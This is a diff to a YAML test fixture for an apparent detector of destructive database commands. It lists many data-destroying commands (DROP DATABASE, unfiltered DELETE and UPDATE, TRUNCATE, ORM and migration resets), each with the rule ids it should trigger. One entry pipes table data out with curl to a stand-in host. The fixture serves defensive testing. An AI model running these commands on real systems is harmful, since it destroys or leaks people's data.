@@ -71,24 +71,84 @@
 
 # -- database — quoted and schema-qualified table names --
 - test: "DELETE FROM `users`;"
-  description: "BUG: backtick-quoted table, \\w+ doesn't match backticks"
-  expect_ids: []
+  description: "backtick-quoted table name"
+  expect_ids: ["database:delete_all_rows"]
 
 - test: "DROP TABLE `users`"
   description: "backtick-quoted table for DROP TABLE (uses \\s+ not \\w+)"
   expect_ids: ["database:drop_table"]
 
 - test: "DELETE FROM public.users;"
-  description: "BUG: schema.table, \\w+ doesn't match dot"
-  expect_ids: []
+  description: "schema-qualified table name"
+  expect_ids: ["database:delete_all_rows"]
 
 - test: "UPDATE public.users SET active=false;"
-  description: "BUG: schema-qualified UPDATE"
-  expect_ids: []
+  description: "schema-qualified UPDATE"
+  expect_ids: ["database:update_all_rows"]
 
 - test: 'DELETE FROM "users";'
-  description: "BUG: double-quoted table name"
+  description: "double-quoted table name"
+  expect_ids: ["database:delete_all_rows"]
+
+# -- database — WHERE tautologies, comments, TRUNCATE without TABLE --
+- test: "DELETE FROM users WHERE 1=1;"
+  description: "WHERE 1=1 deletes every row"
+  expect_ids: ["database:delete_all_rows"]
+- test: "DELETE FROM users WHERE true"
+  description: "WHERE true deletes every row"
+  expect_ids: ["database:delete_all_rows"]
+- test: "DELETE FROM users -- cleanup"
+  description: "trailing SQL comment"
+  expect_ids: ["database:delete_all_rows"]
+- test: "UPDATE users SET active=false WHERE 1 = 1;"
+  description: "UPDATE with tautological WHERE"
+  expect_ids: ["database:update_all_rows"]
+- test: "UPDATE users SET active=false WHERE type = 1;"
+  description: "UPDATE with a real WHERE starting with t"
   expect_ids: []
+- test: "UPDATE users SET active=false WHERE 1 = 10;"
+  description: "UPDATE with a non-tautological numeric WHERE"
+  expect_ids: []
+- test: "TRUNCATE users;"
+  description: "TRUNCATE without the TABLE keyword (Postgres/MySQL)"
+  expect_ids: ["database:truncate_table"]
+- test: "TRUNCATE public.orders CASCADE"
+  description: "schema-qualified TRUNCATE"
+  expect_ids: ["database:truncate_table"]
+- test: "DROP TABLESPACE fastspace"
+  description: "tablespace has its own id"
+  expect_ids: ["database:drop_tablespace"]
+- test: "DROP OWNED BY app_user"
+  description: "drop owned objects"
+  expect_ids: ["database:drop_schema_role_user"]
+
+# -- database — SQL keywords as arguments of other commands are not SQL --
+- test: "echo drop table support added"
+  description: "unquoted SQL words in echo"
+  expect_ids: []
+- test: "grep -ri drop table src/"
+  description: "unquoted SQL words in grep"
+  expect_ids: []
+- test: "ls drop table"
+  description: "SQL words as ls arguments"
+  expect_ids: []
+- test: 'git commit -m "drop table users"'
+  description: "SQL words in a commit message"
+  expect_ids: []
+
+# -- database — SQL passed through client flags --
+- test: 'psql -h prod -c "DROP DATABASE prod"'
+  description: "quoted psql -c payload"
+  expect_ids: ["database:drop_database", "psql:drop"]
+- test: 'psql -d prod -c "TRUNCATE orders"'
+  description: "quoted psql TRUNCATE payload"
+  expect_ids: ["database:truncate_table"]
+- test: 'mysql -e "DELETE FROM users"'
+  description: "quoted mysql DELETE payload"
+  expect_ids: ["database:delete_all_rows"]
+- test: "psql <<< 'DROP TABLE users'"
+  description: "here-string fed to psql"
+  expect_ids: ["database:drop_table"]
 
 - test: "DELETE FROM users"
   description: "DELETE without semicolon"
@@ -159,8 +219,8 @@
   description: "EDGE: numbers in table name"
   expect_ids: ["database:delete_all_rows"]
 - test: "DELETE FROM users RETURNING *;"
-  description: "EDGE: RETURNING clause should not match delete_all (has content after table)"
-  expect_ids: []
+  description: "RETURNING without WHERE still deletes every row"
+  expect_ids: ["database:delete_all_rows"]
 
 # -- database:update_all_rows edge cases --
 - test: "UPDATE users SET active=false"
@@ -173,7 +233,7 @@
 # -- database:drop_schema_role_user edge cases --
 - test: "DROP SCHEMA IF EXISTS public CASCADE"
   description: "EDGE: IF EXISTS with CASCADE"
-  expect_ids: ["database:drop_schema_role_user"]
+  expect_ids: ["database:drop_schema_role_user", "database:drop_schema_cascade"]
 - test: "DROP ROLE IF EXISTS myrole;"
   description: "EDGE: IF EXISTS for role"
   expect_ids: ["database:drop_schema_role_user"]
@@ -182,3 +242,841 @@
 - test: "DROP INDEX CONCURRENTLY idx_users_email;"
   description: "EDGE: CONCURRENTLY keyword (PostgreSQL)"
   expect_ids: ["database:drop_index"]
+
+# -- round 2: SQL via pipes and comments --
+- test: 'echo "DROP TABLE users;" | psql'
+  description: "echo to psql"
+  expect_ids: ["database:drop_table"]
+- test: 'echo ''DROP DATABASE prod;'' | mysql'
+  description: "echo to mysql"
+  expect_ids: ["database:drop_database"]
+- test: 'DROP /* x */ TABLE users;'
+  description: "block comment"
+  expect_ids: ["database:drop_table"]
+- test: 'echo ''DROP TABLE x'' > notes.sql'
+  description: "negative: echo to a file"
+  expect_ids: ["fs:flush_file_content"]
+
+# -- round 3: more destructive SQL (Dana F11) --
+- test: 'DROP VIEW active_users'
+  description: "drop view"
+  expect_ids: ["database:drop_view"]
+- test: 'DROP MATERIALIZED VIEW IF EXISTS daily_stats'
+  description: "drop materialized view"
+  expect_ids: ["database:drop_view"]
+- test: 'CREATE VIEW v AS SELECT 1'
+  description: "negative: create view"
+  expect_ids: []
+- test: 'DROP FUNCTION calc_total(int)'
+  description: "drop function"
+  expect_ids: ["database:drop_object"]
+- test: 'DROP EXTENSION postgis'
+  description: "drop extension"
+  expect_ids: ["database:drop_object"]
+- test: 'DROP TRIGGER audit_trg ON users'
+  description: "drop trigger"
+  expect_ids: ["database:drop_object"]
+- test: 'DROP EXTENSION postgis CASCADE'
+  description: "drop extension cascade"
+  expect_ids: ["database:drop_object", "database:drop_cascade"]
+- test: 'DROP TABLE users CASCADE'
+  description: "drop table cascade"
+  expect_ids: ["database:drop_table", "database:drop_cascade"]
+- test: 'DROP VIEW v CASCADE;'
+  description: "drop view cascade"
+  expect_ids: ["database:drop_view", "database:drop_cascade"]
+- test: 'DROP SCHEMA billing CASCADE'
+  description: "drop schema cascade"
+  expect_ids: ["database:drop_schema_role_user", "database:drop_schema_cascade"]
+- test: 'REVOKE ALL ON ALL TABLES IN SCHEMA public FROM app'
+  description: "revoke all"
+  expect_ids: ["database:revoke_all"]
+- test: 'REVOKE SELECT ON users FROM intern'
+  description: "negative: narrow revoke"
+  expect_ids: []
+- test: 'ALTER SYSTEM SET max_connections = 10'
+  description: "alter system"
+  expect_ids: ["database:alter_system"]
+- test: 'ALTER SYSTEM RESET ALL'
+  description: "alter system reset"
+  expect_ids: ["database:alter_system"]
+- test: 'COPY users TO PROGRAM ''curl -d @- http://x'''
+  description: "copy to program"
+  expect_ids: ["database:copy_program"]
+- test: 'COPY t FROM PROGRAM ''id'''
+  description: "copy from program"
+  expect_ids: ["database:copy_program"]
+- test: 'COPY users TO STDOUT'
+  description: "negative: copy to stdout"
+  expect_ids: []
+- test: 'EXPLAIN ANALYZE DELETE FROM users'
+  description: "explain analyze runs the delete"
+  expect_ids: ["database:explain_analyze_write"]
+- test: 'EXPLAIN (ANALYZE, BUFFERS) UPDATE users SET a = 1 WHERE id = 2'
+  description: "explain analyze options"
+  expect_ids: ["database:explain_analyze_write"]
+- test: 'EXPLAIN DELETE FROM users'
+  description: "negative: plain explain does not execute"
+  expect_ids: []
+- test: 'EXPLAIN ANALYZE SELECT * FROM users'
+  description: "negative: explain analyze select"
+  expect_ids: []
+- test: 'PREPARE wipe AS DELETE FROM users'
+  description: "prepare delete"
+  expect_ids: ["database:prepare_write"]
+- test: 'PREPARE q(int) AS UPDATE users SET a = $1'
+  description: "prepare update"
+  expect_ids: ["database:prepare_write"]
+- test: 'PREPARE q AS SELECT 1'
+  description: "negative: prepare select"
+  expect_ids: []
+- test: 'SELECT pg_terminate_backend(pid) FROM pg_stat_activity'
+  description: "terminate backends"
+  expect_ids: ["database:terminate_backend"]
+- test: 'DROP KEYSPACE analytics'
+  description: "cassandra drop keyspace"
+  expect_ids: ["database:drop_keyspace"]
+- test: 'ALTER TABLE users DROP CONSTRAINT users_pkey'
+  description: "negative: drop constraint"
+  expect_ids: []
+
+# -- round 4: Dana r3 F6/F7 --
+- test: 'cqlsh -e "DROP KEYSPACE prod"'
+  description: "cqlsh drop keyspace"
+  expect_ids: ["database:cqlsh_drop", "database:drop_keyspace"]
+- test: 'cqlsh cass-1 --execute="TRUNCATE ks.events"'
+  description: "cqlsh truncate with --execute="
+  expect_ids: ["database:cqlsh_drop", "database:truncate_table"]
+- test: 'cqlsh -e "SELECT * FROM ks.events LIMIT 10"'
+  description: "negative: cqlsh select"
+  expect_ids: []
+- test: 'clickhouse-client --query="DROP DATABASE prod"'
+  description: "clickhouse --query= form"
+  expect_ids: ["database:clickhouse_drop", "database:drop_database"]
+- test: 'clickhouse-client --query="SELECT count() FROM hits"'
+  description: "negative: clickhouse select"
+  expect_ids: []
+- test: 'ALTER TABLE users DROP INDEX idx_email'
+  description: "mysql alter table drop index"
+  expect_ids: ["database:alter_drop_index"]
+- test: 'ALTER TABLE `users` ADD COLUMN x INT, DROP KEY idx_email'
+  description: "drop key in a multi-clause alter"
+  expect_ids: ["database:alter_drop_index"]
+- test: 'ALTER TABLE users ADD INDEX idx_email (email)'
+  description: "negative: add index"
+  expect_ids: []
+- test: 'ALTER TABLE users DROP PRIMARY KEY'
+  description: "drop primary key"
+  expect_ids: ["database:alter_drop_key"]
+- test: 'ALTER TABLE orders DROP FOREIGN KEY fk_user'
+  description: "drop foreign key"
+  expect_ids: ["database:alter_drop_key"]
+- test: 'ALTER TABLE orders ADD FOREIGN KEY (user_id) REFERENCES users(id)'
+  description: "negative: add foreign key"
+  expect_ids: []
+- test: 'MERGE INTO users u USING stale s ON u.id = s.id WHEN MATCHED THEN DELETE'
+  description: "merge then delete"
+  expect_ids: ["database:merge_delete"]
+- test: 'MERGE INTO users u USING src s ON u.id = s.id WHEN MATCHED THEN UPDATE SET name = s.name'
+  description: "negative: merge update"
+  expect_ids: []
+# -- round 5 (Dana r4 N4, N11, F5, F7) --
+- test: 'psql -c "DELETE FROM users WHERE ''a''=''a''"'
+  description: "tautology 'a'='a' (string literals are masked) is no WHERE"
+  expect_ids: ["database:delete_all_rows"]
+- test: 'psql -c "DELETE FROM users WHERE ''a'' = ''a''"'
+  description: "tautology with spaces"
+  expect_ids: ["database:delete_all_rows"]
+- test: 'DELETE FROM users WHERE id IS NOT NULL'
+  description: "id IS NOT NULL is every row"
+  expect_ids: ["database:delete_all_rows"]
+- test: 'DELETE FROM sessions WHERE expired_at IS NOT NULL'
+  description: "negative: IS NOT NULL on another column is a real condition"
+  expect_ids: []
+- test: 'DELETE FROM users WHERE 1'
+  description: "WHERE 1 is always true"
+  expect_ids: ["database:delete_all_rows"]
+- test: 'DELETE FROM users USING orders'
+  description: "DELETE ... USING without WHERE"
+  expect_ids: ["database:delete_all_rows"]
+- test: 'DELETE FROM users u USING orders o WHERE u.id = o.user_id'
+  description: "negative: DELETE ... USING with a join condition"
+  expect_ids: []
+- test: 'UPDATE users SET a = lower(b) WHERE id = 42'
+  description: "negative: function call with arguments in SET"
+  expect_ids: []
+- test: 'UPDATE users SET a = 1 WHERE id IS NOT NULL'
+  description: "UPDATE with an always-true WHERE"
+  expect_ids: ["database:update_all_rows"]
+- test: 'UPDATE users SET a = 1 WHERE 1'
+  description: "UPDATE ... WHERE 1"
+  expect_ids: ["database:update_all_rows"]
+- test: 'UPDATE users SET active=false WHERE true'
+  description: "UPDATE ... WHERE true"
+  expect_ids: ["database:update_all_rows"]
+- test: 'UPDATE users SET active=false WHERE trust_level = 3'
+  description: "negative: real WHERE starting with true"
+  expect_ids: []
+- test: 'UPDATE users SET a = 1 -- WHERE id = 1'
+  description: "a WHERE inside a comment does not count"
+  expect_ids: ["database:update_all_rows"]
+- test: 'UPDATE users SET a = 1 RETURNING id'
+  description: "UPDATE ... RETURNING without WHERE"
+  expect_ids: ["database:update_all_rows"]
+- test: 'UPDATE users SET wherever = 1'
+  description: "a column whose name starts with where is not a WHERE clause"
+  expect_ids: ["database:update_all_rows"]
+- test: 'UPDATE Users SET A = 1 WHERE Id = 2'
+  description: "negative: mixed case WHERE"
+  expect_ids: []
+- test: 'clickhouse-client -q "ALTER TABLE events DELETE WHERE 1"'
+  description: "ClickHouse mutation deleting every row"
+  expect_ids: ["database:alter_delete_all"]
+- test: 'clickhouse-client -q "ALTER TABLE events ON CLUSTER main DELETE WHERE 1 = 1"'
+  description: "ClickHouse mutation on a cluster deleting every row"
+  expect_ids: ["database:alter_delete_all"]
+- test: 'clickhouse-client -q "ALTER TABLE events DELETE WHERE user_id = 7"'
+  description: "negative: ClickHouse mutation with a real condition"
+  expect_ids: []
+- test: 'cockroach sql -e "DROP DATABASE prod"'
+  description: "cockroach sql -e DROP DATABASE"
+  expect_ids: ["database:cockroach_drop", "database:drop_database"]
+- test: 'cockroach sql --url postgres://x --execute="TRUNCATE orders"'
+  description: "cockroach sql --execute= TRUNCATE"
+  expect_ids: ["database:cockroach_drop", "database:truncate_table"]
+- test: 'cockroach sql -e "SELECT 1"'
+  description: "negative: cockroach query"
+  expect_ids: []
+- test: 'psql -f /home/dev/cleanup.sql'
+  description: "psql -f runs SQL the shell-level checks cannot see"
+  expect_ids: ["database:sql_from_file"]
+- test: 'psql -d prod --file=cleanup.sql'
+  description: "psql --file="
+  expect_ids: ["database:sql_from_file"]
+- test: 'psql -1 -X -f migrate.sql prod'
+  description: "psql flags before -f"
+  expect_ids: ["database:sql_from_file"]
+- test: 'psql prod < cleanup.sql'
+  description: "psql reading a file on stdin"
+  expect_ids: ["database:sql_from_file"]
+- test: 'mysql prod < /backup/dump.sql'
+  description: "mysql reading a file on stdin"
+  expect_ids: ["database:sql_from_file"]
+- test: 'cat cleanup.sql | psql prod'
+  description: "a file piped into psql"
+  expect_ids: ["database:sql_from_file"]
+- test: 'sqlite3 app.db ".read cleanup.sql"'
+  description: "sqlite3 .read"
+  expect_ids: ["database:sql_from_file"]
+- test: 'mysql -e "source cleanup.sql"'
+  description: "mysql -e source"
+  expect_ids: ["database:sql_from_file"]
+- test: 'psql -f -'
+  description: "negative: psql -f - reads stdin (checked where it comes from)"
+  expect_ids: []
+- test: 'psql -c "SELECT count(*) FROM t WHERE a < b"'
+  description: "negative: a comparison is not a redirect"
+  expect_ids: []
+- test: 'psql -c "SELECT 1" < /dev/null'
+  description: "negative: stdin from /dev/null"
+  expect_ids: []
+- test: 'pg_dump prod -f backup.sql'
+  description: "negative: pg_dump writes a file"
+  expect_ids: []
+
+# -- database:sqlcmd_drop (round 6) --
+- test: 'sqlcmd -S prod -Q "DROP DATABASE prod"'
+  description: "sqlcmd -Q runs a DROP DATABASE"
+  expect_ids: ["database:sqlcmd_drop", "database:drop_database"]
+- test: 'sqlcmd -S prod -d app -q "TRUNCATE TABLE orders"'
+  description: "sqlcmd -q runs a TRUNCATE"
+  expect_ids: ["database:sqlcmd_drop", "database:truncate_table"]
+- test: 'sqlcmd -S prod -Q "SELECT name FROM sys.databases"'
+  description: "negative: sqlcmd read-only query"
+  expect_ids: []
+- test: 'sqlcmd -S prod -Q "DELETE FROM orders"'
+  description: "sqlcmd -Q DELETE without WHERE (dana-r7:D7-2)"
+  expect_ids: ["database:delete_all_rows"]
+- test: 'sqlcmd -S prod -Q "DELETE FROM orders WHERE id = 7"'
+  description: "negative: sqlcmd DELETE with a condition"
+  expect_ids: []
+
+# -- database:lo_unlink_all (round 6) --
+- test: 'psql -c "SELECT lo_unlink(oid) FROM pg_largeobject_metadata"'
+  description: "lo_unlink over every large object"
+  expect_ids: ["database:lo_unlink_all"]
+- test: 'psql -c "SELECT lo_unlink(l.oid) FROM pg_catalog.pg_largeobject_metadata l"'
+  description: "lo_unlink over every large object (qualified catalog)"
+  expect_ids: ["database:lo_unlink_all"]
+- test: 'psql -c "SELECT lo_unlink(16409)"'
+  description: "negative: unlinking one known large object"
+  expect_ids: []
+
+# -- database:innodb_flush_log_off (round 6) --
+- test: 'mysql -e "SET GLOBAL innodb_flush_log_at_trx_commit = 0"'
+  description: "turning off the redo-log flush on commit"
+  expect_ids: ["database:innodb_flush_log_off"]
+- test: 'mysql -e "SET PERSIST innodb_flush_log_at_trx_commit=0"'
+  description: "SET PERSIST form"
+  expect_ids: ["database:innodb_flush_log_off"]
+- test: 'mysql -e "SET GLOBAL innodb_flush_log_at_trx_commit = 1"'
+  description: "negative: the durable setting"
+  expect_ids: []
+
+# -- database:sql_from_file: sqlcmd input files (round 7, Dana r6 N6) --
+- test: 'sqlcmd -S prod -i /home/dev/cleanup.sql'
+  description: "sqlcmd -i runs a file of SQL"
+  expect_ids: ["database:sql_from_file"]
+- test: 'sqlcmd -S prod --input-file=migrate.sql'
+  description: "sqlcmd --input-file="
+  expect_ids: ["database:sql_from_file"]
+- test: 'sqlcmd -S prod -Q "SELECT 1"'
+  description: "negative: sqlcmd without an input file"
+  expect_ids: []
+
+# -- round 8 (R8-WRAP): DELETE ... LIMIT without WHERE (Dana r7 D7-4), migration / ORM resets (D7-1) --
+- test: 'mysql -e ''DELETE FROM users LIMIT 1000'''
+  description: 'DELETE ... LIMIT without WHERE (Dana r7 D7-4)'
+  expect_ids: ["database:delete_limit_without_where"]
+- test: 'mysql -e ''DELETE FROM users ORDER BY id LIMIT 1000'''
+  description: 'DELETE ... ORDER BY ... LIMIT without WHERE'
+  expect_ids: ["database:delete_limit_without_where"]
+- test: 'DELETE FROM users LIMIT 10;'
+  description: 'statement form'
+  expect_ids: ["database:delete_limit_without_where"]
+- test: 'DELETE FROM users WHERE created_at < ''2020-01-01'' LIMIT 1000'
+  description: 'negative: batch purge with a WHERE'
+  expect_ids: []
+- test: 'DELETE FROM users WHERE id = 1 ORDER BY id LIMIT 1'
+  description: 'negative: WHERE before ORDER BY / LIMIT'
+  expect_ids: []
+- test: 'prisma migrate reset --force'
+  description: 'prisma migrate reset (Dana r7 D7-1)'
+  expect_ids: ["database:prisma_migrate_reset"]
+- test: 'npx prisma migrate reset'
+  description: 'prisma migrate reset through npx'
+  expect_ids: ["database:prisma_migrate_reset"]
+- test: 'npx prisma migrate reset --help'
+  description: 'negative: help'
+  expect_ids: []
+- test: 'npx prisma migrate dev'
+  description: 'negative: prisma migrate dev'
+  expect_ids: []
+- test: 'npx prisma migrate deploy'
+  description: 'negative: prisma migrate deploy'
+  expect_ids: []
+- test: 'npx prisma db push --force-reset'
+  description: 'prisma db push --force-reset'
+  expect_ids: ["database:prisma_db_push_force_reset"]
+- test: 'npx prisma db push --accept-data-loss'
+  description: 'prisma db push --accept-data-loss'
+  expect_ids: ["database:prisma_db_push_data_loss"]
+- test: 'npx prisma db push'
+  description: 'negative: prisma db push'
+  expect_ids: []
+- test: 'rails db:drop'
+  description: 'rails db:drop'
+  expect_ids: ["database:rails_db_drop"]
+- test: 'bin/rails db:reset'
+  description: 'bin/rails db:reset'
+  expect_ids: ["database:rails_db_drop"]
+- test: 'bundle exec rake db:migrate:reset'
+  description: 'rake db:migrate:reset'
+  expect_ids: ["database:rails_db_drop"]
+- test: './bin/rails db:drop:all'
+  description: 'db:drop:all'
+  expect_ids: ["database:rails_db_drop"]
+- test: 'rails db:purge'
+  description: 'db:purge'
+  expect_ids: ["database:rails_db_drop"]
+- test: 'rails db:schema:load'
+  description: 'db:schema:load'
+  expect_ids: ["database:rails_schema_load"]
+- test: 'rails db:migrate'
+  description: 'negative: rails db:migrate'
+  expect_ids: []
+- test: 'bin/rails db:rollback'
+  description: 'negative: one-step rollback'
+  expect_ids: []
+- test: 'rails db:migrate:status'
+  description: 'negative: migrate status'
+  expect_ids: []
+- test: 'flyway clean'
+  description: 'flyway clean'
+  expect_ids: ["database:flyway_clean"]
+- test: 'flyway -cleanDisabled=false -url=jdbc:postgresql://db/app clean'
+  description: 'flyway clean with options'
+  expect_ids: ["database:flyway_clean"]
+- test: 'mvn flyway:clean'
+  description: 'maven flyway:clean'
+  expect_ids: ["database:flyway_clean_build_tool"]
+- test: './gradlew flywayClean'
+  description: 'gradle flywayClean'
+  expect_ids: ["database:flyway_clean_build_tool"]
+- test: 'flyway migrate'
+  description: 'negative: flyway migrate'
+  expect_ids: []
+- test: 'flyway info'
+  description: 'negative: flyway info'
+  expect_ids: []
+- test: 'liquibase dropAll'
+  description: 'liquibase dropAll'
+  expect_ids: ["database:liquibase_drop_all"]
+- test: 'liquibase --changelog-file=db.xml drop-all'
+  description: 'liquibase drop-all'
+  expect_ids: ["database:liquibase_drop_all"]
+- test: 'liquibase update'
+  description: 'negative: liquibase update'
+  expect_ids: []
+- test: 'django-admin flush --noinput'
+  description: 'django flush'
+  expect_ids: ["database:django_flush"]
+- test: 'python manage.py flush --noinput'
+  description: 'manage.py flush'
+  expect_ids: ["database:django_flush"]
+- test: './manage.py reset_db'
+  description: 'django-extensions reset_db'
+  expect_ids: ["database:django_flush"]
+- test: 'python manage.py migrate'
+  description: 'negative: manage.py migrate'
+  expect_ids: []
+- test: 'python manage.py sqlflush'
+  description: 'negative: sqlflush only prints SQL'
+  expect_ids: []
+- test: 'python manage.py migrate billing zero'
+  description: 'migrate <app> zero'
+  expect_ids: ["database:django_migrate_zero"]
+- test: 'dbmate drop'
+  description: 'dbmate drop'
+  expect_ids: ["database:dbmate_drop"]
+- test: 'dbmate --url postgres://db/app drop'
+  description: 'dbmate drop with url'
+  expect_ids: ["database:dbmate_drop"]
+- test: 'dbmate up'
+  description: 'negative: dbmate up'
+  expect_ids: []
+- test: 'alembic downgrade base'
+  description: 'alembic downgrade base'
+  expect_ids: ["database:alembic_downgrade_base"]
+- test: 'alembic -c alembic.ini downgrade base'
+  description: 'alembic downgrade base with config'
+  expect_ids: ["database:alembic_downgrade_base"]
+- test: 'alembic downgrade base --sql'
+  description: 'negative: offline SQL generation'
+  expect_ids: []
+- test: 'alembic upgrade head'
+  description: 'negative: alembic upgrade head'
+  expect_ids: []
+- test: 'alembic downgrade -1'
+  description: 'negative: one-step downgrade'
+  expect_ids: []
+- test: 'npx knex migrate:rollback --all'
+  description: 'knex rollback all'
+  expect_ids: ["database:knex_rollback_all"]
+- test: 'npx knex migrate:rollback'
+  description: 'negative: one batch'
+  expect_ids: []
+- test: 'sqitch revert -y'
+  description: 'sqitch revert -y'
+  expect_ids: ["database:sqitch_revert"]
+- test: 'sqitch rebase --target prod -y'
+  description: 'sqitch rebase -y'
+  expect_ids: ["database:sqitch_revert"]
+- test: 'sqitch deploy'
+  description: 'negative: sqitch deploy'
+  expect_ids: []
+- test: 'npx sequelize db:drop'
+  description: 'sequelize db:drop'
+  expect_ids: ["database:sequelize_db_drop"]
+- test: 'npx sequelize-cli db:migrate:undo:all'
+  description: 'sequelize undo all'
+  expect_ids: ["database:sequelize_undo_all"]
+- test: 'npx sequelize-cli db:migrate'
+  description: 'negative: sequelize migrate'
+  expect_ids: []
+- test: 'npx typeorm schema:drop -d src/data-source.ts'
+  description: 'typeorm schema:drop'
+  expect_ids: ["database:typeorm_schema_drop"]
+- test: 'npx typeorm-ts-node-commonjs schema:drop'
+  description: 'typeorm ts-node schema:drop'
+  expect_ids: ["database:typeorm_schema_drop"]
+- test: 'npx typeorm migration:run'
+  description: 'negative: typeorm migration:run'
+  expect_ids: []
+- test: 'npx drizzle-kit drop'
+  description: 'drizzle-kit drop'
+  expect_ids: ["database:drizzle_kit_drop"]
+- test: 'npx drizzle-kit push --force'
+  description: 'drizzle-kit push --force'
+  expect_ids: ["database:drizzle_push_force"]
+- test: 'npx drizzle-kit push'
+  description: 'negative: drizzle-kit push asks itself'
+  expect_ids: []
+- test: 'npx drizzle-kit generate'
+  description: 'negative: drizzle-kit generate'
+  expect_ids: []
+- test: 'mix ecto.drop'
+  description: 'mix ecto.drop'
+  expect_ids: ["database:ecto_drop"]
+- test: 'MIX_ENV=prod mix ecto.reset'
+  description: 'mix ecto.reset'
+  expect_ids: ["database:ecto_drop"]
+- test: 'mix ecto.migrate'
+  description: 'negative: mix ecto.migrate'
+  expect_ids: []
+- test: 'php artisan migrate:fresh --seed'
+  description: 'artisan migrate:fresh'
+  expect_ids: ["database:artisan_wipe"]
+- test: 'php artisan db:wipe'
+  description: 'artisan db:wipe'
+  expect_ids: ["database:artisan_wipe"]
+- test: 'php artisan migrate:refresh'
+  description: 'artisan migrate:refresh'
+  expect_ids: ["database:artisan_migrate_reset"]
+- test: 'php artisan migrate'
+  description: 'negative: artisan migrate'
+  expect_ids: []
+- test: 'php bin/console doctrine:database:drop --force'
+  description: 'doctrine database drop'
+  expect_ids: ["database:doctrine_drop"]
+- test: 'php bin/console doctrine:schema:drop --full-database --force'
+  description: 'doctrine schema drop'
+  expect_ids: ["database:doctrine_drop"]
+- test: 'php bin/console doctrine:schema:drop --dump-sql'
+  description: 'negative: dump-sql only prints'
+  expect_ids: []
+- test: 'migrate -path db/migrations -database postgres://db/app drop -f'
+  description: 'golang-migrate drop'
+  expect_ids: ["database:golang_migrate_drop"]
+- test: 'migrate -path db/migrations -database postgres://db/app up'
+  description: 'negative: golang-migrate up'
+  expect_ids: []
+- test: 'goose -dir db postgres postgres://db/app reset'
+  description: 'goose reset'
+  expect_ids: ["database:goose_reset"]
+- test: 'goose up'
+  description: 'negative: goose up'
+  expect_ids: []
+- test: 'diesel database reset'
+  description: 'diesel database reset'
+  expect_ids: ["database:cli_database_drop"]
+- test: 'sqlx database drop -y'
+  description: 'sqlx database drop'
+  expect_ids: ["database:cli_database_drop"]
+- test: 'sqlx database create'
+  description: 'negative: sqlx database create'
+  expect_ids: []
+- test: 'atlas schema clean -u postgres://db/app'
+  description: 'atlas schema clean'
+  expect_ids: ["database:atlas_schema_clean"]
+- test: 'atlas schema apply -u postgres://db/app'
+  description: 'negative: atlas schema apply'
+  expect_ids: []
+
+# ---- round 9 (R9-CATALOG) ----
+# -- database:delete_all_rows --
+- test: "mysql -e \"DELETE IGNORE FROM users\""
+  description: "MySQL DELETE IGNORE without WHERE"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE LOW_PRIORITY FROM users\""
+  description: "MySQL DELETE LOW_PRIORITY without WHERE"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE LOW_PRIORITY QUICK IGNORE FROM users\""
+  description: "all three modifiers"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE IGNORE QUICK FROM users\""
+  description: "modifiers in any order"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE u FROM users u\""
+  description: "multi-table form without WHERE"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE u.* FROM users AS u\""
+  description: "multi-table form with alias.*"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE a, b FROM a, b\""
+  description: "multi-table delete of two tables, no WHERE"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE t FROM t LEFT JOIN u ON t.id = u.tid\""
+  description: "a LEFT JOIN does not filter the target rows"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE IGNORE t FROM t\""
+  description: "modifier plus multi-table form"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE IGNORE FROM users WHERE 1=1\""
+  description: "always-true WHERE with a modifier"
+  expect_ids: ["database:delete_all_rows"]
+- test: "mysql -e \"DELETE t FROM t JOIN u ON t.id = u.tid\""
+  description: "an inner JOIN ... ON filters the rows"
+  expect_ids: []
+- test: "mysql -e \"DELETE t FROM t LEFT JOIN u ON t.id = u.tid WHERE u.id IS NULL\""
+  description: "anti-join with a WHERE"
+  expect_ids: []
+- test: "mysql -e \"DELETE u FROM users u WHERE u.id = 3\""
+  description: "multi-table form with a WHERE"
+  expect_ids: []
+- test: "mysql -e \"DELETE IGNORE FROM users WHERE id = 3\""
+  description: "modifier with a real WHERE"
+  expect_ids: []
+# -- database:delete_limit_without_where --
+- test: "mysql -e \"DELETE QUICK FROM users LIMIT 5\""
+  description: "modifier with LIMIT and no WHERE"
+  expect_ids: ["database:delete_limit_without_where"]
+- test: "mysql -e \"DELETE LOW_PRIORITY IGNORE FROM users ORDER BY id LIMIT 100\""
+  description: "modifiers, ORDER BY and LIMIT"
+  expect_ids: ["database:delete_limit_without_where"]
+- test: "mysql -e \"DELETE IGNORE FROM users WHERE id < 10 LIMIT 5\""
+  description: "a WHERE with LIMIT is fine"
+  expect_ids: []
+# -- database:dotnet_ef_database_drop --
+- test: "dotnet ef database drop --force"
+  description: "EF Core drops the database"
+  expect_ids: ["database:dotnet_ef_database_drop"]
+- test: "dotnet ef database drop"
+  description: "it asks, but still drops"
+  expect_ids: ["database:dotnet_ef_database_drop"]
+- test: "dotnet-ef database drop -f"
+  description: "the dotnet-ef tool name"
+  expect_ids: ["database:dotnet_ef_database_drop"]
+- test: "dotnet ef --project src/App database drop --force"
+  description: "options before the subcommand"
+  expect_ids: ["database:dotnet_ef_database_drop"]
+- test: "dotnet ef database drop --dry-run"
+  description: "a dry run only prints"
+  expect_ids: []
+- test: "dotnet ef migrations list"
+  description: "listing migrations"
+  expect_ids: []
+# -- database:dotnet_ef_update_zero --
+- test: "dotnet ef database update 0"
+  description: "reverts every migration"
+  expect_ids: ["database:dotnet_ef_update_zero"]
+- test: "dotnet ef database update 0 --context AppDb"
+  description: "with options"
+  expect_ids: ["database:dotnet_ef_update_zero"]
+- test: "dotnet ef database update"
+  description: "applying migrations"
+  expect_ids: []
+- test: "dotnet ef database update AddUsers"
+  description: "updating to a named migration"
+  expect_ids: []
+- test: "dotnet ef database update 20230101000000_Init"
+  description: "a migration id that starts with digits"
+  expect_ids: []
+# -- database:ecto_rollback_all --
+- test: "mix ecto.rollback --all"
+  description: "rolls back every migration"
+  expect_ids: ["database:ecto_rollback_all"]
+- test: "MIX_ENV=prod mix ecto.rollback -r App.Repo --all"
